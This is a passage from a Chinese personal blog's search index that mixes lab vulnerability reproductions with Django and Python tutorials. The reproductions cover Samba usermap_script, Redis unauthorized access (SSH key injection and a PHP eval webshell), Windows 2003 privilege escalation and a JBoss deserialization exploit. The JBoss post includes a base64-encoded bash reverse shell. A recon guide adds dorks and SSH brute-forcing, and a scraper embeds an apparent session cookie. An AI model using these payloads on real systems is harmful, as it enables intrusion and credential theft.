    <content type="text"><![CDATA[usermap_script：CVE-2007-2447Samba用户名映射脚本命令执行 漏洞产生原因传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中，导致允许远程命令执行。 msf 中模块位置 exploit/multi/samba/usermap_script 这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名 漏洞复现攻击机 kaliIP 192.168.195.133 靶机 Metasploitable_ubuntuIP 192.168.195.132 搜索有关samba漏洞的代码库 search samba 使用usermap_script代码 use exploit/multi/samba/usermap_script 查看攻击载荷 show payloads 并选择bind_netcat即使用netcat工具在渗透攻击成功后执行shell并通过netcat绑定在一个监听端口上 set payload cmd/unix/bind_netcat 查看参数配置 show options 设置目标ip set RHOST 192.168.195.132 执行exploit成功获取靶机shell exploit]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Redis-未授权访问（反弹shell）]]></title>
    <url>%2F2018%2F12%2F09%2FRedis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%8F%8D%E5%BC%B9shell%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Redis安装环境：Centos 7 wget 获取 redis 安装包 [ root@test ]# wget http://download.redis.io/releases/redis-4.0.8.tar.gz 解压 [ root@test ]# tar -zxvf redis-4.0.8.tar.gz yum安装gcc依赖 [ root@test ]# yum install gcc 编译 [ root@test redis-4.0.6 ]# make MALLOC=libc 将/redis-4.0.6/src目录下的文件加到/usr/local/bin目录 [ root@test redis-4.0.6 ]# cd src &amp;&amp; make install 启动 [ root@test src ]# ./redis-server 如图即成功启动 反弹 shell 方法1.通过写SSH-KEY的方式获取shell利用条件：redis 以root 权限开启6379 端口开启并允许外部使用目标服务器支持免密登录 攻击机本地生成ssh秘钥 [ root@test ]# ssh-keygen -t rsa 将公钥导出写入txt文件方便利用 [ root@test:~/.ssh ]# (echo -e “\n\n\n\n”; cat id_rsa.pub; echo -e “\n\n\n\n”) &gt;123.txt 利用redis-cli进行远程连接 [ root@test ] redis-cli -h 靶机ip 设置redis工作路径、文件、写入公钥并保存 靶机ip:6379&gt; config set dir /root/.ssh/OK靶机ip:6379&gt; config get dir“dir”“/root/.ssh”靶机ip:6379&gt; config set dbfilename “authorized_keys”OK靶机ip:6379&gt; saveOK 远程连接，利用自己的私钥登录服务器 ssh -i id_rsa root@靶机ip 2. 向Web路径写webshell利用条件：知道web目录具有写入文件的权限 靶机ip:6379&gt; config set dir /var/www/html/OK靶机ip:6379&gt; config set dbfilename shell.phpOK靶机ip:6379&gt; set x “&lt;?php @eval($_POST[‘wcute’]);?&gt;”OK靶机ip:6379&gt; saveOK 成功写入后可利用菜刀连接]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows-Sever-2003-提权]]></title>
    <url>%2F2018%2F12%2F09%2FWindows-Sever-2003-%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[本地提权Administrator 提权至 System 权限 测试机：Windows Sever 2003 C:\Documents and Settings\Administrator&gt;at 10:31 /interactive cmd 新加了一项作业，其作业 ID = 2 #10:31 启动cmd命令行 cmd 权限变更为 system explorer.exe # 桌面进程 此时用户是Administrator 结束进程后 利用 cmd 的 taskmgr 命令启动任务管理器 重新创建 explorer.exe 进程 此时用户已变更为 system 注入进程提权注入进程提权：相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听 pinjector.exe程序下载地址：https://www.tarasco.org/security/Process_Injector/index.html 靶机：win server2003 ip：192.168.195.129 cmd 运行 pinjector.exe 程序 pinjector # 参数及说明pinjector -l # 列出当前执行的进程及其相应的用户名pinjector -p pid cmd port # 对pid进程执行注入 查看当前进程及用户 此时1234端口未被占用 选取进程进行注入 pinjector -p 440 cmd 1234 再次查看1234端口发现被占用 同时kali中可以利用nc进行监听，获取system权限]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现]]></title>
    <url>%2F2018%2F12%2F09%2FJBoss-5-x-6-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞描述该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker组件中的 ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。 复现过程 运行测试环境 cd /vulhub-master/jboss/CVE-2017-12149docker-compose up -d 访问 http://本机ip:8080查看Jboss默认页面 编写反弹 shell 命令使用 bash 进行反弹shell，但由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，需要用进行一次编码。 工具：http://jackson.thuraisamy.me/runtime-exec-payloads.html bash -i &gt;&amp; /dev/tcp/攻击机ip/监听port 0&gt;&amp;1 生成序列化数据使用 ysoserial 来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5： 1java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser 发送 POC生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly 成功反弹到 shell 修复方法 不需要 http-invoker.sar 组件的用户可直接删除此组件。 添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：&lt;url-pattern&gt;/*&lt;/url-pattern&gt;]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Django---简单博客搭建（Django安装）]]></title>
    <url>%2F2018%2F12%2F09%2FDjango---%E7%AE%80%E5%8D%95%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%EF%BC%88Django%E5%AE%89%E8%A3%85%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Django 安装 安装 pip install Django==1.10.2 查看是否安装成功 python -m django version 创建新项目 D:\python&gt;django-admin startproject myblog 此时自建项目目录生成 目录结构: 1234567891011manage.py 与项目进行交互的命令行工具集的入口myblog 项目容器，包含项目最基本的一些配置，目录名不建议修改__init__.py python 中声名模块的文件，默认内容为空settings.py 项目总配置文件（数据库、Web应用、时间等配置）urls.py url 配置文件wsgi.py python 与web服务器网关接口 启动django自带的服务器 python manage.py runserver 【端口】 显示默认web地址和端口 ，更改端口只需在命令后面加上使用的端口号 应用创建创建步骤： 打开命令行，进入manage.py 的同级目录 输入：python manage.py startapp blog 添加应用名到 settings.py 中的 INSTALLED_APPS里 应用目录结构 1234567891011migrations 数据移植模块，内容自动生成admin.py 后台管理系统配置apps.py 该应用的一些配置，Django-1.9以后自动生成models.py 数据模块tests.py 自动化测试模块，可在此编写测试脚本views.py 执行响应的代码所在模块，代码逻辑处理主要地点，大部分代码在此编写 创建第一个响应页面 在 blog 的 views.py 编写代码并保存1234567from django.shortcuts import renderfrom django.http import HttpResponsedef index(request):return HttpResponse(&apos;hello&apos;) 注：每个响应对应一个函数，函数必须返回一个响应函数必须存在一个参数，一般约定为 request每一个响应函数对应一个URL 进入 myblog 的配置文件 settings.py，在 INSTALLED_APPS 中添加 blog 应用 进入 myblog 的url配置文件 urls.py，导入模块并配置url URL 配置一123456789import blog.views as asdurlpatterns = [url(r&apos;^admin/&apos;, admin.site.urls),url(r&apos;^index/&apos;, asd.index),] 注：URL函数有三个参数：URL（正则），对应方法，名称URL函数存放在 urlpatterns 列表中 URL配置二 (1) 在 myblog 的 urls.py 中导入 include 模块，并在urlpatterns中添加url1234567from django.conf.urls import url,includeurlpatterns = [url(r&apos;^index/&apos;, include(&apos;blog.urls&apos;)),] (2) blog目录下创建urls.py 编写 url 访问方式123456789from django.conf.urls import urlfrom . import viewsurlpatterns = [url(r&apos;^$&apos;, views.index),] 启动服务器python manage.py runserver 打开浏览器，访问 http://127.0.0.1:8000/index/]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python3-学习（爬虫实例）]]></title>
    <url>%2F2018%2F12%2F09%2FPython3-%E5%AD%A6%E4%B9%A0%EF%BC%88%E7%88%AC%E8%99%AB%E5%AE%9E%E4%BE%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[爬虫 bs4参考链接：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html 实例1：利用百度搜索接口，编写url采集器 import requests from bs4 import BeautifulSoup headers={&apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&apos;} for i in range(1,100,10): bd_search=&quot;https://www.baidu.com/s?wd=inurl:/dede/login.php?&amp;pn=%s&quot; %str(i) r=requests.get(bd_search,headers=headers) soup=BeautifulSoup(r.text,&quot;lxml&quot;) url_list=soup.select(&quot;.t &gt; a&quot;) # 获得所有class为t的标签 for url in url_list: real_url=url[&quot;href&quot;] r=requests.get(real_url) print (r.url) 实例2： 爬取文章标题 import requests import re def get_article(): for x in range(1,59): url=&quot;http://zone.secevery.com/sort_ytpe-new__day-0__is_recommend-0_page-&quot; url=url+str(x) resp=requests.get(url) result=re.findall(br&apos;&lt;a href=&quot;http://zone.secevery.com/article/\d+&quot;&gt;(.*?)&lt;/a&gt;&apos;,resp.content) for article in result: print (article.decode(&apos;utf-8&apos;)) if __name__==&apos;__main__&apos;: get_article() 实例3： 爬取文章标题并写入文件 #-*-coding UTF_8 -*- import requests import re from bs4 import BeautifulSoup headers={ &apos;Host&apos;: &quot;zone.secevery.com&quot;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;, &apos;Referer&apos;:&apos;https://www.baidu.com&apos; } def get_total_pages(): url=&apos;http://zone.secevery.com/&apos; response=requests.get(url=url,headers=headers) soup=BeautifulSoup(response.content,&apos;html.parser&apos;) a=soup.find_all(&apos;a&apos;,href=re.compile(&apos;is_recommend-0__page-&apos;)) a=str(a[-1]) total_pages=a.split(&apos;-&apos;)[-1].split(&apos;&quot;&apos;)[0] return total_pages def get_total_titles(pages): titles=[] total_pages=int(pages) for page in range(1,int(total_pages)): url=&apos;http://zone.secevery.com/sort_type-new__day-0__is_recommend-0__page-%d&apos;%page resp=requests.get(url=url,headers=headers) soup=BeautifulSoup(resp.content,&apos;html.parser&apos;) a = soup.find_all(&apos;a&apos;,href=re.compile(r&apos;com/article&apos;)) for i in a: if i.string != &quot;查看全部&quot;: titles.append(i.string) return titles def write_txt(titles): with open(&apos;title1.txt&apos;,&apos;w&apos;) as f: for title in titles: f.write(title+&apos;\n&apos;) if __name__==&apos;__main__&apos;: print(&apos;-&apos;*60) print(&quot;程序启动中......&quot;) print(&apos;-&apos;*60) pages=get_total_pages() print(&quot;总页数为：%s&quot; % pages) print(&apos;-&apos;*60) print(&quot;正在获取数据，请稍后....&quot;) titles=get_total_titles(pages) print(&apos;文件正在写入,请稍后...&apos;) print(&apos;-&apos;*60) write_txt(titles) print(&quot;well done!&quot;) 实例4：爬取补天公益SRC链接 import requests from requests.packages import urllib3 from bs4 import BeautifulSoup # 项目大厅链接 # https://butian.360.cn/Reward/plan # 厂商提交漏洞的链接 # https://butian.360.cn/Loo/submit?cid=61101 headers={ &quot;Host&quot;: &quot;butian.360.cn&quot;, &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;, &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Referer&quot;: &quot;https://butian.360.cn/Reward/plan&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Length&quot;: &quot;14&quot;, &quot;Cookie&quot;: &quot;test_cookie_enable=null; __huid=108OHneOmn%2FGBQ%2BJukK2rK3j4HhKMHdLMfd%2BokoEYRQKE%3D; __guid=91251416.1657029331559520500.1512282503171.2822; __DC_gid=90162694.998847747.1523438745794.1537231453981.287; smidV2=201804121919226e10578a54cc4cce100543952a4e7b000018db7a8e1407320; Q=u%3D360H2620192781%26n%3D%26le%3D%26m%3DZGHlWGWOWGWOWGWOWGWOWGWOZwHm%26qid%3D2620192781%26im%3D1_t0105d6cf9b508f72c8%26src%3Dpcw_webscan%26t%3D1; T=s%3D8b8f0bc6b26203525eb9f114ee626b0e%26t%3D1536202563%26lm%3D%26lf%3D2%26sk%3Daa11fbae76d233eeabdcbbb8abdf885b%26mt%3D1536202563%26rc%3D%26v%3D2.0%26a%3D1; __gid=67796994.160790607.1526525535847.1528973038214.14; UM_distinctid=1636c03266b578-07963af4955a558-4c312a7a-144000-1636c03266c426; __DC_monitor_count=20; PHPSESSID=ingp9jlm0d9v5tosb2do8bs8u7; __q__=1537231281479; test_cookie_enable=null; __DC_sid=138613664.439132718304839230.1537229417384.1438; wzwsconfirm=732968041ce27324ddd8dcf54d958661; wzwstemplate=Mw==; wzwschallenge=-1; ccpassport=5a26b60aa93bd3303aea3061a756590d; wzwsvtime=1537230292&quot;, } data={ &quot;s&quot;:&quot;1&quot;, &quot;p&quot;:&quot;1&quot;, &quot;token&quot;:&quot;&quot;, &quot;sort&quot;:&quot;1&quot; } urllib3.disable_warnings() # 消除警告 #获取厂商总页数 def get_total_pages(): url=&quot;https://butian.360.cn/Reward/pub&quot; resp=requests.post(url=url,headers=headers,data=data,verify=False) company_info=resp.json() total_pages=company_info[&apos;data&apos;][&apos;count&apos;] return total_pages #获取厂商ID def get_all_company_id(total_pages): company_id=[] for x in range(1,int(total_pages)+1): print (&quot;正在获取第%d页列表&quot; %x) data[&apos;p&apos;]=x url=&quot;https://butian.360.cn/Reward/pub&quot; resp=requests.post(url=url,headers=headers,data=data,verify=False) info=resp.json() company_info=info[&apos;data&apos;][&apos;list&apos;] for company in company_info: company_id.append(company[&apos;company_id&apos;]) return company_id # 获取厂商域名 def get_all_company_host(company_id): hosts=[] print (&quot;正在获取域名，请稍后&quot;) for x in company_id: url=&quot;https://butian.360.cn/Loo/submit?cid=%d&quot; % int(x) resp=requests.get(url=url,headers=headers,data=data,verify=False) soup=BeautifulSoup(resp.content,&quot;html.parser&quot;) inp=soup.find_all(&apos;input&apos;) print (inp[4][&apos;value&apos;]) hosts.append(inp[4][&apos;value&apos;]) return hosts # 写入txt文件 def write(hosts): with open(&apos;butian_spider.text&apos;,&apos;w&apos;) as f: for url in hosts: f.write(url+&apos;\n&apos;) if __name__==&quot;__main__&quot;: total_pages=get_total_pages() company_id=get_all_company_id(total_pages) hosts=get_all_company_host(company_id) print (&quot;正在写入文件&quot;) write(hosts) print (&quot;成功写入&quot;)]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Django---简单博客搭建（2）]]></title>
    <url>%2F2018%2F12%2F09%2FDjango---%E7%AE%80%E5%8D%95%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%EF%BC%882%EF%BC%89%2F</url>
    <content type="text"><![CDATA[博客页面分类：1.博客主页面2.博客文章内容页面3.博客撰写页面 主页面内容： 文章标题列表，超链接 取出数据库中所有文章对象 将文章对象打包成列表，传递到前端 前端页面把文章以标题超链接的形式逐个列出 后端 views.py 123456789# -*- coding:utf-8 -*-from django.shortcuts import renderfrom django.http import HttpResponsefrom . import models# 获取所有文章def index(request):articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;) 前端 index.html 123456789101112&lt;!--撰写博客入口--&gt;&lt;h2&gt;&lt;a href=&quot;&quot;&gt;编写新文章&lt;/a&gt;&lt;/h2&gt;&lt;!--文章列表--&gt;&lt;h3&gt;文章列表：&lt;br&gt;&#123;% for article in articles %&#125;&lt;a href=&quot;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;&lt;br/&gt;&#123;% endfor %&#125; 发表博客按钮（超链接）博客文章内容页面 利用文章 ID 获取单个文章对象 后端 view.py12345678910111213# -*- coding:utf-8 -*-from django.shortcuts import renderfrom django.http import HttpResponsefrom . import modelsdef index(request):articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)# 获取文章对象def article_page(request,article_id):article = models.Article.objects.get(pk=article_id)return render(request,&apos;blog/article_page.html&apos;,&#123;&apos;article&apos;:article&#125;) 编写显示文章内容页面的前端 前端 articl_page.html123456&lt;!--显示单个文章标题和内容--&gt;&lt;h1&gt;&#123;&#123;article.title&#125;&#125;&lt;/h1&gt;&lt;br&gt;&lt;h3&gt;&#123;&#123;article.content&#125;&#125;&lt;/h3&gt;&lt;br&gt;&lt;br&gt;&lt;!--修改文章链接--&gt;&lt;a href=&quot;&quot;&gt;修改文章&lt;/a&gt; 修改 URL 配置 urls.py12345678# -*- coding:utf-8 -*-from django.conf.urls import urlfrom . import viewsurlpatterns = [url(r&apos;^index/$&apos;, views.index), url(r&apos;^article/(?P&lt;article_id&gt;[0-9]+)$&apos;, views.article_page), ]]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透测试前期--信息搜集]]></title>
    <url>%2F2018%2F12%2F09%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%89%8D%E6%9C%9F---%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[Web 信息搜集 Web 信息搜集（探测）即 Web 踩点，主要是掌握目标Web服务的方方面面，是实现Web渗透入侵前的准备工作 Web 踩点内容包括操作系统（linux、windows等）、服务器类型（服务器平台、版本等）、数据库类型（access、sqlsever、mysql、oracle、postgresql等）、Web 容器（iis、Apache、nginx、tomcat等）、脚本类型（ASP、php/jsp、aspx等）、域名信息、网站目录、CMS、WAF等 Web 信息搜集涉及搜索引擎、网站扫描、域名遍历、指纹识别等工作 外围信息搜集通过DNS和IP挖掘目标网络信息1. whois域名注册信息查询 msf &gt; whois testfire.net nslookup与dig域名查询IP2Location地理位置查询 dig @&lt;DNS 服务器&gt; &lt;待查询的域名&gt; http://www.maxmind.com 2. Google Maps http://www.cz88.net(国内IP查询) 3. netcraft网站提供的信息查询服务 http://searchdns.netcraft.com/ (查询子域名) https://toolbar.netcraft.com/site_report 4. IP2Domain 反查域名 http://www.webscan.cc/ 通过搜索引擎进行信息搜集1. Google Hacking 可使用参数：site filetype inurl intitle intext 举例： inurl:/admin/login.php # 搜索网址中有 &quot;/admin/login.php&quot; 的网页 intitle:后台管理 filetypr:php # 搜索标题是后台管理的 php 页面 intitle:index of&quot;parent directory&quot; # 搜索根目录相关的索引目录信息 intext:Powered by wordpress # 搜索 wordpress 制作的博客网址 intext:Powered by *CMS # 搜索*CMS相关的页面 intext:powered by xxx inurl:login # 搜索此类网址的后台登录页面 2. 探索网站目录结构 敏感目录收集方向：robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件 Google 搜索 parent directory site:baidu.com 1. 扩展名为inc的文件：可能会包含网站的配置信息，如数据库用户名／口令等， 2. 扩展名为bak的文件：通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。 3. 扩展名为txt或sql的文件：一般包含网站运行的SQL脚本，可能会透露类似数据库结构等信息 3. 搜索网站中的E-mail地址 msf中search_email_collector模块通过多个搜索引擎的查询结果分析使用此后缀的邮件地址从而获取某个机构的大量邮件地址 4. 搜索易存在SQL注入点的页面 Google搜索 site:testfire.net inurl:login 5. shodan 搜索 主机探测与端口扫描活跃主机扫描1. ICMP Ping 命令 2. Metasploit的主机发现模块 常用模块 arp_sweep 使用ARP请求枚举本地局域网中的所有活跃主机 udp_sweep 通过发送UDP数据包探查制定主机是否活跃，并发现主机上的UDP服务 arpping(不支持同一网段扫描) arping IP arping IP -c 1 //一次返回一条数据 3. 使用Nmap进行主机探测(支持同一网段扫描) nmap -sn IP //扫描存活主机，只做ping扫描不做端口扫描 4. arp侦查-netdiscover 主动探测 netdiscover -i eth0 -r 192.168.1.1/24 // -i 指定网卡 -r 指定ip范围 被动探测 netdiscover -p 操作系统辨识Nmap 扫描 -O 参数对目标操作系统进行识别 Nmap 扫描 -sV 参数对其服务版本进行识别 端口扫描与服务类型探测 端口扫描工具：nmap portscan ntscan telnet 1. Metasploit 中的端口扫描器 msf &gt; search portscan ack：通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测 ftpbounce：通过 FTP bounce 攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能够很好的防范FTP bounce 攻击，但在一些旧的 Solaris及 FREEBSD系统的FTP服务中此类攻击方式仍能够b被利用 syn：使用发送 TCP SYN 标志的方式探测开放的端口 tcp：通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度较慢。 xmas：一种更为隐秘的扫描方式，通过发送FIN、PSH和URG标志，能够躲避一些高级的TCP标记监测器的过滤。 2. Nmap端口扫描功能 常见端口 IIS（HTTP）：80 SQLServer：1433 爆破 Oracle：1521 MySQL：3306 爆破 FTP：21 匿名访问 SSH：22 hydra爆破 Tomcat：8080 SSL服务：443 心脏出血漏洞 1.0.1g版本之前 Redis：6379 未授权访问 weblogic：7001 SSRF/反序列化漏洞、控制台部署 getshell zabbix控制台：8069 弱口令/注入 elasticsearch：9200 远程代码执行漏洞 memcacache：1121 未授权访问 mongondb：27017 未授权访问 RDP远程桌面：3389 爆破 Weblogic默认端口:7001 端口类型: open：一个应用程序正在此端口上进行监听，以接收来自TCP、UDP或SCTP协议的数据。这是在渗透测试中最关注的一类端口，开放端口往往能够为我们提供一条能够进入系统的攻击路径.（端口开放） closed：关闭的端口指的是主机已响应，但没有应用程序监听的端口。这些信息并非毫无价值，扫描出关闭端口至少说明主机是活跃的。（端口关闭） filtered：指Nmap不能确认端口是否开放，但根据响应数据猜测该端口可能被防火墙等设备过滤 unfiltered：仅在使用ACK扫描时，Nmap无法确定端口是否开放，会归为此类。可以使用其他类型的扫描（如Window扫描、SYN扫描、FIN扫描）进一步确认端口的信息。 open|filtered：端口开放或屏蔽 常用的Nmap扫描类型参数主要有： -p | -F ：-p 指定端口 | -F 执行快速扫描 -sT： TCP connect扫描，类似Metasploit中的tcp扫描模块 -ss： TCP SYN扫描，类似 Metasploit中的syn扫描模块。 -sF/-sX/-sN：这些扫描通过发送一些特殊的标志位以避开设备或软件的监测。 -sP：通过发送 ICMP echo请求探测主机是否存活，原理同Ping。 -sU：探测目标主机开放了哪些UDP端口 -sA： TCP ACK扫描，类似 Metasploit中的ack扫描模块 4. 指纹识别1. whatweb 获取目标网站的系统、容器、脚本、版本信息 whatweb -h # 查看参数 whatweb url/ip # 基础扫描 whatweb -a 3 -v url/ip # 详细扫描 2. 御剑指纹识别 服务器扫描与查点常见网络服务扫描1. Telnet 服务扫描 msf &gt; use auxiliary/scanner/telnet/telnet_version 2. SSH 服务扫描 msf &gt; use auxiliary/scanner/ssh/ssh_version 3. Oracle 数据库服务查点 msf &gt; use auxiliary/scanner/oracle/tnslsnr_version 4. 开放代理探测与利用 设置代理服务器 msf &gt; use auxiliary/scanner/http/open_proxy 5. nmap服务器扫描 -sV：版本探测 -O：启用操作系统探测 --osscan-limit：对指定的目标系统进行操作系统探测 口令猜测与嗅探 1. SSH服务口令猜测 msf &gt; use auxiliary/scanner/ssh/ssh_login msf &gt; set RHOSTS x.x.x.x msf &gt; set USERNAME root msf &gt; set PASS_FILE /root/words.txt msf &gt; set THREADS 50 msf &gt; run 2. psnuffle 口令嗅探 截获常见协议的身份认证过程 msf &gt; use auxiliary/sniffer/psnuffle 后台查找1. 弱口令默认后台：admin，admin/login.asp，manage，login.asp等常见后台 2. 查看网页的链接：一般来说，网站的主页有管理登录类似的东西，有些可能被管理员删除 3. 查看网站图片的属性 4. 查看网站使用的管理系统，从而确定后台 5. 用工具查找：www.scan，intellitamper，御剑 6. robots.txt 的帮助：robots.txt文件告诉支柱程序在服务器上什么样的文件可以被查看 7. GooglHacker 8. 查看网站使用的编辑器是否有默认后台 9. 短文件利用 10. sqlmap --sql-shell load_file(&apos;&apos;);]]></content>
      <categories>
        <category>Metasploit 渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python3-学习（2）]]></title>
    <url>%2F2018%2F12%2F09%2Fpython3-%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89%2F</url>
    <content type="text"><![CDATA[python类的继承实例： class people: name=&apos;&apos; age=0 __weight=0 #定义私有属性,私有属性在类外部无法直接进行访问 def __init__(self,n,a,w): self.name=n self.age=a self.__weight=w def speak(self): print (&quot;%s 说,我 %d 岁&quot;%(self.name,self.age)) class student(people): grade=&apos;&apos; def __init__(self,n,a,w,g): people.__init__(self,n,a,w) # 调用父类的构函 self.grade=g def speak(self): # 覆写父类的方法 print (&quot;%s 说,我 %d 岁,我在读 %s年级&quot;%(self.name,self.age,self.grade)) i=people(&quot;wu&quot;,45,&quot;50kg&quot;) i.speak() # wu 说,我 45 岁 s=student(&quot;liu&quot;,65,&quot;58kg&quot;,&quot;6&quot;) s.speak() # liu 说,我 65 岁,我在读6年级 *args 和 **args用法def printinfo(name,age,**args): #输入多余参数有变量名，就保存在**args中，保存方式为字典 # 打印任何传入的字符串 print (&quot;name:&quot;,name) print (&quot;age:&quot;,age) print (args) if __name__==&apos;__main__&apos;: printinfo(&quot;sad&quot;,18,a=123,b=5) def max_num(*args): print (args) # *args 以元组的方式传入 print (max(args)) def test(name,age,*args1,**args2): # 多余参数中既有*args类型，也有**args类型 必须*args在前，**args在后 print (args1) print (args2) max_num(44,12) test(&quot;asd&quot;,15,85,12,a=123,b=478) #在传递参数时，也需先传*args类型，再传**args 输出： name: sad age: 18 {&apos;a&apos;: 123, &apos;b&apos;: 5} (44, 12) 44 (85, 12) {&apos;a&apos;: 123, &apos;b&apos;: 478} base64 base64原理：把3字节的二进制数据编码为4字节的文本数据，长度增加33% 编码后的文本数据可以在邮件正文、网页等直接显示编码的二进制数据不是3的倍数时，用 \x00 字节在末尾补足后，再在编码的末尾加上1个或2个=号，表示补了多少字节，解码时自动去掉 b’str’ 表示字节 ##### 文件操作 打开文件的模式有(默认为文本模式)：r ，只读模式【默认模式，文件必须存在，不存在则抛出异常】w，只写模式【不可读；不存在则创建；存在则清空内容】a， 之追加写模式【不可读；不存在则创建；存在则只追加内容】 对于非文本文件，我们只能使用b模式，”b”表示以字节的方式操作（而所有文件也都是以字节的形式存储的，使用这种模式无需考虑文本文件的字符编码、图片文件的jgp格式、视频文件的avi格式）rb wb ab注：以b方式打开时，读取到的内容是字节类型，写入时也需要提供字节类型，不能指定编码 正则表达式模式 描述 ^ 匹配字符串的开头 $ 匹配字符串的末尾 # &apos;abc$&apos;匹配以&apos;abc&apos;结尾的字符串 . 匹配任意一个字符（除换行符），当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 [...] 匹配在一个范围内的单个字符 # [amk] 匹配 &apos;a&apos;，&apos;m&apos;或&apos;k&apos; [^...] 不在[]中的字符 # [^abc] 匹配除了a,b,c之外的字符。 r&apos;..&apos; 匹配原始字符集 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n,} 精确匹配n个前面表达式。 re{ m, n} 匹配 m 到 n 次由前面的正则表达式定义的片段，贪婪方式 a| b 匹配a或b (re) G匹配括号内的表达式，也表示一个组 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (...), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#...) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 ... 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 (?&gt; re) 匹配的独立模式，省去回溯。 \w 匹配字母数字及下划线 \W 匹配非字母数字及下划线 \s 匹配任意空白字符，等价于 [\t\n\r\f]. \S 匹配任意非空字符 \d 匹配任意数字，等价于 [0-9]. \D 匹配任意非数字 \A 匹配字符串开始 \Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。c \z 匹配字符串结束 \G 匹配最后匹配完成的位置。 \b 匹配一个单词边界，也就是指单词和空格间的位置。例如， &apos;er\b&apos; 可以匹配&quot;never&quot; 中的 &apos;er&apos;，但不能匹配 &quot;verb&quot; 中的 &apos;er&apos;。 \B 匹配非单词边界。&apos;er\B&apos; 能匹配 &quot;verb&quot; 中的 &apos;er&apos;，但不能匹配 &quot;never&quot; 中的 &apos;er&apos;。 \n, \t 等 